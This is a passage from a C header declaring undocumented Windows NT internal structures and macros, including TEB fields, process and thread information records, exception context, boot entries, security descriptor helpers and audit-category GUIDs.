    UCHAR SpareBytes[24];
#else
    UCHAR SpareBytes[36];
#endif
    ULONG TxFsContext;

    GDI_TEB_BATCH GdiTebBatch;
    CLIENT_ID RealClientId;
    HANDLE GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    PVOID GdiThreadLocalInfo;
    ULONG_PTR Win32ClientInfo[62];
    PVOID glDispatchTable[233];
    ULONG_PTR glReserved1[29];
    PVOID glReserved2;
    PVOID glSectionInfo;
    PVOID glSection;
    PVOID glTable;
    PVOID glCurrentRC;
    PVOID glContext;

    NTSTATUS LastStatusValue;
    UNICODE_STRING StaticUnicodeString;
    WCHAR StaticUnicodeBuffer[261];

    PVOID DeallocationStack;
    PVOID TlsSlots[64];
    LIST_ENTRY TlsLinks;

    PVOID Vdm;
    PVOID ReservedForNtRpc;
    PVOID DbgSsReserved[2];

    ULONG HardErrorMode;
#if defined(_M_X64)
    PVOID Instrumentation[11];
#else
    PVOID Instrumentation[9];
#endif
    GUID ActivityId;

    PVOID SubProcessTag;
    PVOID EtwLocalData;
    PVOID EtwTraceData;
    PVOID WinSockData;
    ULONG GdiBatchCount;

    union
    {
        PROCESSOR_NUMBER CurrentIdealProcessor;
        ULONG IdealProcessorValue;
        struct
        {
            UCHAR ReservedPad0;
            UCHAR ReservedPad1;
            UCHAR ReservedPad2;
            UCHAR IdealProcessor;
        };
    };

    ULONG GuaranteedStackBytes;
    PVOID ReservedForPerf;
    PVOID ReservedForOle;
    ULONG WaitingOnLoaderLock;
    PVOID SavedPriorityState;
    ULONG_PTR SoftPatchPtr1;
    PVOID ThreadPoolData;
    PPVOID TlsExpansionSlots;
#if defined(_M_X64)
    PVOID DeallocationBStore;
    PVOID BStoreLimit;
#endif
    ULONG MuiGeneration;
    ULONG IsImpersonating;
    PVOID NlsCache;
    PVOID pShimData;
    ULONG HeapVirtualAffinity;
    HANDLE CurrentTransactionHandle;
    PTEB_ACTIVE_FRAME ActiveFrame;
    PVOID FlsData;

    PVOID PreferredLanguages;
    PVOID UserPrefLanguages;
    PVOID MergedPrefLanguages;
    ULONG MuiImpersonation;

    union
    {
        USHORT CrossTebFlags;
        USHORT SpareCrossTebBits : 16;
    };
    union
    {
        USHORT SameTebFlags;
        struct
        {
            USHORT SafeThunkCall : 1;
            USHORT InDebugPrint : 1;
            USHORT HasFiberData : 1;
            USHORT SkipThreadAttach : 1;
            USHORT WerInShipAssertCode : 1;
            USHORT RanProcessInit : 1;
            USHORT ClonedThread : 1;
            USHORT SuppressDebugMsg : 1;
            USHORT DisableUserStackWalk : 1;
            USHORT RtlExceptionAttached : 1;
            USHORT InitialThread : 1;
            USHORT SpareSameTebBits : 1;
        };
    };

    PVOID TxnScopeEnterCallback;
    PVOID TxnScopeExitCallback;
    PVOID TxnScopeContext;
    ULONG LockCount;
    ULONG SpareUlong0;
    PVOID ResourceRetValue;
} TEB, *PTEB;

#define PcTeb 0x18

#define RtlGetCurrentProcessId() (HandleToUlong(NtCurrentTeb()->ClientId.UniqueProcess))
#define RtlGetCurrentThreadId()  (HandleToUlong(NtCurrentTeb()->ClientId.UniqueThread))

#define ZwCurrentProcess() NtCurrentProcess()

// 17/3/2011 added
__inline struct _PEB * NtCurrentPeb() { return NtCurrentTeb()->ProcessEnvironmentBlock; }
#define WOWAddress() ( NtCurrentTeb()->WOW32Reserved )
#define RtlProcessHeap() ( NtCurrentPeb()->ProcessHeap )

// 28/3/2011 added
#define RtlAcquireLockRoutine(L) RtlEnterCriticalSection((PRTL_CRITICAL_SECTION)(L))

// added 18.04.2011
typedef struct _THREAD_BASIC_INFORMATION
{
	NTSTATUS ExitStatus;
	PTEB TebBaseAddress;
	CLIENT_ID ClientId;
	KAFFINITY AffinityMask;
	KPRIORITY Priority;
	KPRIORITY BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

// added 20.12.11
// Process Device Map information
//  NtQueryInformationProcess using ProcessDeviceMap
//  NtSetInformationProcess using ProcessDeviceMap
//
//#pragma pack (push, 1)
typedef struct _PROCESS_DEVICEMAP_INFORMATION {
    union {
        struct {
            HANDLE DirectoryHandle;
        } Set;
        struct {
            ULONG DriveMap;
            UCHAR DriveType[ 32 ];
        } Query;
    };
} PROCESS_DEVICEMAP_INFORMATION, *PPROCESS_DEVICEMAP_INFORMATION;

typedef struct _PROCESS_DEVICEMAP_INFORMATION_EX {
    union {
        struct {
            HANDLE DirectoryHandle;
        } Set;
        struct {
            ULONG DriveMap;
            UCHAR DriveType[ 32 ];
        } Query;
    };
    ULONG Flags;    // specifies that the query type
} PROCESS_DEVICEMAP_INFORMATION_EX, *PPROCESS_DEVICEMAP_INFORMATION_EX;
//#pragma pack(pop)

typedef struct _PROCESS_BASIC_INFORMATION
{
	NTSTATUS ExitStatus;
	PPEB PebBaseAddress;
	ULONG_PTR AffinityMask;
	KPRIORITY BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;
typedef PROCESS_BASIC_INFORMATION *PPROCESS_BASIC_INFORMATION;

typedef struct _PROCESS_EXTENDED_BASIC_INFORMATION
{
	SIZE_T Size;    // Must be set to structure size on input
	PROCESS_BASIC_INFORMATION BasicInfo;
	union
	{
		ULONG Flags;
		struct
		{
			ULONG IsProtectedProcess : 1;
			ULONG IsWow64Process : 1;
			ULONG IsProcessDeleting : 1;
			ULONG IsCrossSessionCreate : 1;
			ULONG SpareBits : 28;
		} DUMMYSTRUCTNAME;
	} DUMMYUNIONNAME;
} PROCESS_EXTENDED_BASIC_INFORMATION, *PPROCESS_EXTENDED_BASIC_INFORMATION;

typedef struct _RTL_HEAP_ENTRY
{
	SIZE_T Size;
	USHORT Flags;
	USHORT AllocatorBackTraceIndex;
	union
	{
		struct
		{
			SIZE_T Settable;
			ULONG Tag;
		} s1;   // All other heap entries
		struct
		{
			SIZE_T CommittedSize;
			PVOID FirstBlock;
		} s2;   // RTL_SEGMENT
	} u;
} RTL_HEAP_ENTRY, *PRTL_HEAP_ENTRY;

#define RTL_HEAP_BUSY               (USHORT)0x0001
#define RTL_HEAP_SEGMENT            (USHORT)0x0002
#define RTL_HEAP_SETTABLE_VALUE     (USHORT)0x0010
#define RTL_HEAP_SETTABLE_FLAG1     (USHORT)0x0020
#define RTL_HEAP_SETTABLE_FLAG2     (USHORT)0x0040
#define RTL_HEAP_SETTABLE_FLAG3     (USHORT)0x0080
#define RTL_HEAP_SETTABLE_FLAGS     (USHORT)0x00E0
#define RTL_HEAP_UNCOMMITTED_RANGE  (USHORT)0x0100
#define RTL_HEAP_PROTECTED_ENTRY    (USHORT)0x0200

typedef struct _RTL_HEAP_TAG
{
	ULONG NumberOfAllocations;
	ULONG NumberOfFrees;
	SIZE_T BytesAllocated;
	USHORT TagIndex;
	USHORT CreatorBackTraceIndex;
	WCHAR TagName[ 24 ];
} RTL_HEAP_TAG, *PRTL_HEAP_TAG;

typedef struct _RTL_HEAP_INFORMATION
{
	PVOID BaseAddress;
	ULONG Flags;
	USHORT EntryOverhead;
	USHORT CreatorBackTraceIndex;
	SIZE_T BytesAllocated;
	SIZE_T BytesCommitted;
	ULONG NumberOfTags;
	ULONG NumberOfEntries;
	ULONG NumberOfPseudoTags;
	ULONG PseudoTagGranularity;
	ULONG Reserved[ 5 ];
	PRTL_HEAP_TAG Tags;
	PRTL_HEAP_ENTRY Entries;
} RTL_HEAP_INFORMATION, *PRTL_HEAP_INFORMATION;

typedef struct _RTL_PROCESS_HEAPS
{
	ULONG NumberOfHeaps;
	RTL_HEAP_INFORMATION Heaps[ 1 ];
} RTL_PROCESS_HEAPS, *PRTL_PROCESS_HEAPS;

typedef struct _RTL_PROCESS_LOCK_INFORMATION
{
	PVOID Address;
	USHORT Type;
	USHORT CreatorBackTraceIndex;

	HANDLE OwningThread;        // from the thread's ClientId->UniqueThread
	LONG LockCount;
	ULONG ContentionCount;
	ULONG EntryCount;

	//
	// The following fields are only valid for Type == RTL_CRITSECT_TYPE
	//

	LONG RecursionCount;

	//
	// The following fields are only valid for Type == RTL_RESOURCE_TYPE
	//

	ULONG NumberOfWaitingShared;
	ULONG NumberOfWaitingExclusive;
} RTL_PROCESS_LOCK_INFORMATION, *PRTL_PROCESS_LOCK_INFORMATION;

// do not name SHA_CTX, if using OpenSSL or such... produces errors.
typedef struct {
	ULONG Unknown[6];
	ULONG State[5];
	ULONG Count[2];
	UCHAR Buffer[64];
} ASHA_CTX, *PSHA_CTX;

struct _CONTEXT;
struct _EXCEPTION_RECORD;

// note, winnt.h ... such the pain-in-ass with this structure.
#if !defined(_WINNT_)
typedef
EXCEPTION_DISPOSITION
(*PEXCEPTION_ROUTINE) (
    IN struct _EXCEPTION_RECORD *ExceptionRecord,
    IN PVOID EstablisherFrame,
    IN OUT struct _CONTEXT *ContextRecord,
    IN OUT PVOID DispatcherContext
    );

typedef struct _EXCEPTION_REGISTRATION_RECORD {
    struct _EXCEPTION_REGISTRATION_RECORD *Next;
    PEXCEPTION_ROUTINE Handler;
} EXCEPTION_REGISTRATION_RECORD;

typedef EXCEPTION_REGISTRATION_RECORD *PEXCEPTION_REGISTRATION_RECORD;
#endif

#if !defined(POINTER_64)
#define POINTER_64 __ptr64
typedef unsigned __int64 POINTER_64_INT;
#if defined(_M_X64)
#define POINTER_32 __ptr32
#else
#define POINTER_32
#endif
#endif

typedef enum _NT_PRODUCT_TYPE
{
	NtProductWinNt = 1,
	NtProductLanManNt,
	NtProductServer
} NT_PRODUCT_TYPE, *PNT_PRODUCT_TYPE;


typedef enum _SUITE_TYPE
{
	SmallBusiness,
	Enterprise,
	BackOffice,
	CommunicationServer,
	TerminalServer,
	SmallBusinessRestricted,
	EmbeddedNT,
	DataCenter,
	SingleUserTS,
	Personal,
	Blade,
	EmbeddedRestricted,
	SecurityAppliance,
	StorageServer,
	ComputeServer,
	MaxSuiteType
} SUITE_TYPE;

#define VER_SERVER_NT                       0x80000000
#define VER_WORKSTATION_NT                  0x40000000
#define VER_SUITE_SMALLBUSINESS             0x00000001
#define VER_SUITE_ENTERPRISE                0x00000002
#define VER_SUITE_BACKOFFICE                0x00000004
#define VER_SUITE_COMMUNICATIONS            0x00000008
#define VER_SUITE_TERMINAL                  0x00000010
#define VER_SUITE_SMALLBUSINESS_RESTRICTED  0x00000020
#define VER_SUITE_EMBEDDEDNT                0x00000040
#define VER_SUITE_DATACENTER                0x00000080
#define VER_SUITE_SINGLEUSERTS              0x00000100
#define VER_SUITE_PERSONAL                  0x00000200
#define VER_SUITE_BLADE                     0x00000400
#define VER_SUITE_EMBEDDED_RESTRICTED       0x00000800
#define VER_SUITE_SECURITY_APPLIANCE        0x00001000
#define VER_SUITE_STORAGE_SERVER            0x00002000
#define VER_SUITE_COMPUTE_SERVER            0x00004000

//
// exception structures
//

#ifndef _WINNT_		// take presidence over winnt.h

typedef struct _CONTEXT
{

	//
	// The flags values within this flag control the contents of
	// a CONTEXT record.
	//
	// If the context record is used as an input parameter, then
	// for each portion of the context record controlled by a flag
	// whose value is set, it is assumed that that portion of the
	// context record contains valid context. If the context record
	// is being used to modify a threads context, then only that
	// portion of the threads context will be modified.
	//
	// If the context record is used as an IN OUT parameter to capture
	// the context of a thread, then only those portions of the thread's
	// context corresponding to set flags will be returned.
	//
	// The context record is never used as an OUT only parameter.
	//

	DWORD ContextFlags;

	//
	// This section is specified/returned if CONTEXT_DEBUG_REGISTERS is
	// set in ContextFlags.  Note that CONTEXT_DEBUG_REGISTERS is NOT
	// included in CONTEXT_FULL.
	//

	DWORD   Dr0;
	DWORD   Dr1;
	DWORD   Dr2;
	DWORD   Dr3;
	DWORD   Dr6;
	DWORD   Dr7;

	//
	// This section is specified/returned if the
	// ContextFlags word contians the flag CONTEXT_FLOATING_POINT.
	//

	FLOATING_SAVE_AREA FloatSave;

	//
	// This section is specified/returned if the
	// ContextFlags word contians the flag CONTEXT_SEGMENTS.
	//

	DWORD   SegGs;
	DWORD   SegFs;
	DWORD   SegEs;
	DWORD   SegDs;

	//
	// This section is specified/returned if the
	// ContextFlags word contians the flag CONTEXT_INTEGER.
	//

	DWORD   Edi;
	DWORD   Esi;
	DWORD   Ebx;
	DWORD   Edx;
	DWORD   Ecx;
	DWORD   Eax;

	//
	// This section is specified/returned if the
	// ContextFlags word contians the flag CONTEXT_CONTROL.
	//

	DWORD   Ebp;
	DWORD   Eip;
	DWORD   SegCs;              // MUST BE SANITIZED
	DWORD   EFlags;             // MUST BE SANITIZED
	DWORD   Esp;
	DWORD   SegSs;

	//
	// This section is specified/returned if the ContextFlags word
	// contains the flag CONTEXT_EXTENDED_REGISTERS.
	// The format and contexts are processor specific
	//

	BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];

} CONTEXT, *PCONTEXT;

typedef struct _EXCEPTION_RECORD
{
	DWORD  ExceptionCode;																						// NTSTATUS code of the exception.
	DWORD ExceptionFlags;																						// need more information
	struct _EXCEPTION_RECORD *ExceptionRecord;											// pointer to an extra record
	PVOID ExceptionAddress;																					// address of the exception happen
	DWORD NumberParameters;																					// more information needed ...
	ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];
} EXCEPTION_RECORD, *PEXCEPTION_RECORD;

//
//  Values put in ExceptionRecord.ExceptionInformation[0]
//  First parameter is always in ExceptionInformation[1],
//  Second parameter is always in ExceptionInformation[2]
//

typedef struct _EXCEPTION_RECORD32 {
	DWORD ExceptionCode;
	DWORD ExceptionFlags;
	DWORD ExceptionRecord;
	DWORD ExceptionAddress;
	DWORD NumberParameters;
	DWORD ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];
} EXCEPTION_RECORD32, *PEXCEPTION_RECORD32;

typedef struct _EXCEPTION_RECORD64 {
	DWORD    ExceptionCode;
	DWORD ExceptionFlags;
	DWORD64 ExceptionRecord;
	DWORD64 ExceptionAddress;
	DWORD NumberParameters;
	DWORD __unusedAlignment;
	DWORD64 ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];
} EXCEPTION_RECORD64, *PEXCEPTION_RECORD64;

//
// Typedef for pointer returned by exception_info()
//

typedef struct _EXCEPTION_POINTERS
{
	PEXCEPTION_RECORD ExceptionRecord;
	PCONTEXT ContextRecord;
} EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;

#endif

typedef NTSTATUS (NTAPI * PRTL_QUERY_REGISTRY_ROUTINE)(
	IN PWSTR ValueName,
	IN ULONG ValueType,
	IN PVOID ValueData,
	IN ULONG ValueLength,
	IN PVOID Context,
	IN PVOID EntryContext
	);

typedef struct _RTL_QUERY_REGISTRY_TABLE {
	PRTL_QUERY_REGISTRY_ROUTINE QueryRoutine;
	ULONG Flags;
	PWSTR Name;
	PVOID EntryContext;
	ULONG DefaultType;
	PVOID DefaultData;
	ULONG DefaultLength;

} RTL_QUERY_REGISTRY_TABLE, *PRTL_QUERY_REGISTRY_TABLE;

#define EXCEPTION_CHAIN_END ((struct _EXCEPTION_REGISTRATION_RECORD * POINTER_32)-1)

#define MAJOR_VERSION 30
#define MINOR_VERSION 00
#define OS2_VERSION (MAJOR_VERSION << 8 | MINOR_VERSION )

#ifdef DBG
#define DBG_TEB_THREADNAME 16
#define DBG_TEB_RESERVED_1 15
#define DBG_TEB_RESERVED_2 14
#define DBG_TEB_RESERVED_3 13
#define DBG_TEB_RESERVED_4 12
#define DBG_TEB_RESERVED_5 11
#define DBG_TEB_RESERVED_6 10
#define DBG_TEB_RESERVED_7  9
#define DBG_TEB_RESERVED_8  8
#endif // DBG

#define PROCESS_PRIORITY_CLASS_UNKNOWN      0
#define PROCESS_PRIORITY_CLASS_IDLE         1
#define PROCESS_PRIORITY_CLASS_NORMAL       2
#define PROCESS_PRIORITY_CLASS_HIGH         3
#define PROCESS_PRIORITY_CLASS_REALTIME     4
#define PROCESS_PRIORITY_CLASS_BELOW_NORMAL 5
#define PROCESS_PRIORITY_CLASS_ABOVE_NORMAL 6

typedef struct _PROCESS_PRIORITY_CLASS {
	BOOLEAN Foreground;
	UCHAR PriorityClass;
} PROCESS_PRIORITY_CLASS, *PPROCESS_PRIORITY_CLASS;

typedef struct _PROCESS_FOREGROUND_BACKGROUND {
	BOOLEAN Foreground;
} PROCESS_FOREGROUND_BACKGROUND, *PPROCESS_FOREGROUND_BACKGROUND;

typedef struct _FILE_PATH {
	ULONG Version;
	ULONG Length;
	ULONG Type;
	UCHAR FilePath[ANYSIZE_ARRAY];
} FILE_PATH, *PFILE_PATH;

#define FILE_PATH_VERSION 1

#define FILE_PATH_TYPE_ARC           1
#define FILE_PATH_TYPE_ARC_SIGNATURE 2
#define FILE_PATH_TYPE_NT            3
#define FILE_PATH_TYPE_EFI           4

#define FILE_PATH_TYPE_MIN FILE_PATH_TYPE_ARC
#define FILE_PATH_TYPE_MAX FILE_PATH_TYPE_EFI

typedef struct _WINDOWS_OS_OPTIONS {
	UCHAR Signature[8];
	ULONG Version;
	ULONG Length;
	ULONG OsLoadPathOffset;
	WCHAR OsLoadOptions[ANYSIZE_ARRAY];
	//FILE_PATH OsLoadPath;
} WINDOWS_OS_OPTIONS, *PWINDOWS_OS_OPTIONS;

#define WINDOWS_OS_OPTIONS_SIGNATURE "WINDOWS"

#define WINDOWS_OS_OPTIONS_VERSION 1

typedef struct _BOOT_ENTRY {
	ULONG Version;
	ULONG Length;
	ULONG Id;
	ULONG Attributes;
	ULONG FriendlyNameOffset;
	ULONG BootFilePathOffset;
	ULONG OsOptionsLength;
	UCHAR OsOptions[ANYSIZE_ARRAY];
	//WCHAR FriendlyName[ANYSIZE_ARRAY];
	//FILE_PATH BootFilePath;
} BOOT_ENTRY, *PBOOT_ENTRY;

typedef struct _BOOT_OPTIONS {
	ULONG Version;
	ULONG Length;
	ULONG Timeout;
	ULONG CurrentBootEntryId;
	ULONG NextBootEntryId;
	WCHAR HeadlessRedirection[ANYSIZE_ARRAY];
} BOOT_OPTIONS, *PBOOT_OPTIONS;


//
// Security APIs.
//

typedef struct _USER_SID
{
	SID_IDENTIFIER_AUTHORITY sidAuthority;
	ULONG UserGroupId;
	ULONG UserId;
} USER_SID, *PUSER_SID;


typedef struct _USER_PERMISSION
{
	USER_SID UserSid;						// identifies the user for whom you want to grant permissions to
	ULONG dwAccessType;         // currently, this is either ACCESS_ALLOWED_ACE_TYPE or  ACCESS_DENIED_ACE_TYPE
	BOOL bInherit;              // the permissions inheritable? (eg a directory or reg key and you want new children to inherit this permission)
	ULONG dwAccessMask;         // access granted (eg FILE_LIST_CONTENTS or KEY_ALL_ACCESS, etc...)
	ULONG dwInheritMask;        // mask used for inheritance, usually (OBJECT_INHERIT_ACE | CONTAINER_INHERIT_ACE | INHERIT_ONLY_ACE)
	ULONG dwInheritAccessMask;  // the inheritable access granted (eg GENERIC_ALL)
} USER_PERMISSION, *PUSER_PERMISSION;

#define LongAlignPtr(Ptr) ((PVOID)(((ULONG_PTR)(Ptr) + 3) & -4))
#define LongAlignSize(Size) (((ULONG)(Size) + 3) & -4)

//
// Macros for calculating the address of the components of a security
// descriptor.  This will calculate the address of the field regardless
// of whether the security descriptor is absolute or self-relative form.
// A null value indicates the specified field is not present in the
// security descriptor.
//

#define RtlpOwnerAddrSecurityDescriptor( SD )                                  \
           (  ((SD)->Control & SE_SELF_RELATIVE) ?                             \
               (   (((SECURITY_DESCRIPTOR_RELATIVE *) (SD))->Owner == 0) ? ((PSID) NULL) :               \
                       (PSID)RtlOffsetToPointer((SD), ((SECURITY_DESCRIPTOR_RELATIVE *) (SD))->Owner)    \
               ) :                                                             \
               (PSID)((SD)->Owner)                                             \
           )

#define RtlpGroupAddrSecurityDescriptor( SD )                                  \
           (  ((SD)->Control & SE_SELF_RELATIVE) ?                             \
               (   (((SECURITY_DESCRIPTOR_RELATIVE *) (SD))->Group == 0) ? ((PSID) NULL) :               \
                       (PSID)RtlOffsetToPointer((SD), ((SECURITY_DESCRIPTOR_RELATIVE *) (SD))->Group)    \
               ) :                                                             \
               (PSID)((SD)->Group)                                             \
           )

#define RtlpSaclAddrSecurityDescriptor( SD )                                   \
           ( (!((SD)->Control & SE_SACL_PRESENT) ) ?                           \
             (PACL)NULL :                                                      \
               (  ((SD)->Control & SE_SELF_RELATIVE) ?                         \
                   (   (((SECURITY_DESCRIPTOR_RELATIVE *) (SD))->Sacl == 0) ? ((PACL) NULL) :            \
                           (PACL)RtlOffsetToPointer((SD), ((SECURITY_DESCRIPTOR_RELATIVE *) (SD))->Sacl) \
                   ) :                                                         \
                   (PACL)((SD)->Sacl)                                          \
               )                                                               \
           )

#define RtlpDaclAddrSecurityDescriptor( SD )                                   \
           ( (!((SD)->Control & SE_DACL_PRESENT) ) ?                           \
             (PACL)NULL :                                                      \
               (  ((SD)->Control & SE_SELF_RELATIVE) ?                         \
                   (   (((SECURITY_DESCRIPTOR_RELATIVE *) (SD))->Dacl == 0) ? ((PACL) NULL) :            \
                           (PACL)RtlOffsetToPointer((SD), ((SECURITY_DESCRIPTOR_RELATIVE *) (SD))->Dacl) \
                   ) :                                                         \
                   (PACL)((SD)->Dacl)                                          \
               )                                                               \
           )


//
//  Macro to determine if the given ID has the owner attribute set,
//  which means that it may be assignable as an owner
//  The GroupSid should not be marked for UseForDenyOnly.
//

#define RtlpIdAssignableAsOwner( G )                                               \
            ( (((G).Attributes & SE_GROUP_OWNER) != 0)  &&                         \
              (((G).Attributes & SE_GROUP_USE_FOR_DENY_ONLY) == 0) )

//
//  Macro to copy the state of the passed bits from the old security
//  descriptor (OldSD) into the Control field of the new one (NewSD)
//

#define RtlpPropagateControlBits( NewSD, OldSD, Bits )                             \
            ( NewSD )->Control |=                     \
            (                                                                  \
            ( OldSD )->Control & ( Bits )             \
            )


//
//  Macro to query whether or not the passed set of bits are ALL on
//  or not (ie, returns FALSE if some are on and not others)
//

#define RtlpAreControlBitsSet( SD, Bits )                                          \
            (BOOLEAN)                                                          \
            (                                                                  \
            (( SD )->Control & ( Bits )) == ( Bits )  \
            )

//
//  Macro to set the passed control bits in the given Security Descriptor
//

#define RtlpSetControlBits( SD, Bits )                                             \
            (                                                                  \
            ( SD )->Control |= ( Bits )                                        \
            )

//
//  Macro to clear the passed control bits in the given Security Descriptor
//

#define RtlpClearControlBits( SD, Bits )	\
            (															\
            ( SD )->Control &= ~( Bits )	\
            )


//
// Local Security Authority APIs.
//

#ifdef DEFINE_GUID

/* 0cce9210-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_System_SecurityStateChange_defined)
    DEFINE_GUID(
        Audit_System_SecurityStateChange,
        0x0cce9210,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_System_SecurityStateChange_defined
    #endif
#endif

/* 0cce9211-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_System_SecuritySubsystemExtension_defined)
    DEFINE_GUID(
        Audit_System_SecuritySubsystemExtension,
        0x0cce9211,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_System_SecuritySubsystemExtension_defined
    #endif
#endif

/* 0cce9212-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_System_Integrity_defined)
    DEFINE_GUID(
        Audit_System_Integrity,
        0x0cce9212,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_System_Integrity_defined
    #endif
#endif

/* 0cce9213-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_System_IPSecDriverEvents_defined)
    DEFINE_GUID(
        Audit_System_IPSecDriverEvents,
        0x0cce9213,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_System_IPSecDriverEvents_defined
    #endif
#endif

/* 0cce9214-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_System_Others_defined)
    DEFINE_GUID(
        Audit_System_Others,
        0x0cce9214,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_System_Others_defined
    #endif
#endif

/* 0cce9215-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_Logon_defined)
    DEFINE_GUID(
        Audit_Logon_Logon,
        0x0cce9215,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_Logon_defined
    #endif
#endif

/* 0cce9216-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_Logoff_defined)
    DEFINE_GUID(
        Audit_Logon_Logoff,
        0x0cce9216,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_Logoff_defined
    #endif
#endif

/* 0cce9217-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_AccountLockout_defined)
    DEFINE_GUID(
        Audit_Logon_AccountLockout,
        0x0cce9217,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_AccountLockout_defined
    #endif
#endif

/* 0cce9218-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_IPSecMainMode_defined)
    DEFINE_GUID(
        Audit_Logon_IPSecMainMode,
        0x0cce9218,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_IPSecMainMode_defined
    #endif
#endif

/* 0cce9219-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_IPSecQuickMode_defined)
    DEFINE_GUID(
        Audit_Logon_IPSecQuickMode,
        0x0cce9219,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_IPSecQuickMode_defined
    #endif
#endif

/* 0cce921a-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_IPSecUserMode_defined)
    DEFINE_GUID(
        Audit_Logon_IPSecUserMode,
        0x0cce921a,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_IPSecUserMode_defined
    #endif
#endif

/* 0cce921b-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_SpecialLogon_defined)
    DEFINE_GUID(
        Audit_Logon_SpecialLogon,
        0x0cce921b,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_SpecialLogon_defined
    #endif
#endif

/* 0cce921c-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_Others_defined)
    DEFINE_GUID(
        Audit_Logon_Others,
        0x0cce921c,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_Others_defined
    #endif
#endif

/* 0cce921d-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_FileSystem_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_FileSystem,
        0x0cce921d,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_FileSystem_defined
    #endif
#endif

/* 0cce921e-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_Registry_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_Registry,
        0x0cce921e,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_Registry_defined
    #endif
#endif

/* 0cce921f-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_Kernel_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_Kernel,
        0x0cce921f,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_Kernel_defined
    #endif
#endif

/* 0cce9220-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_Sam_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_Sam,
        0x0cce9220,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_Sam_defined
    #endif
#endif

/* 0cce9221-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_CertificationServices_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_CertificationServices,
        0x0cce9221,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
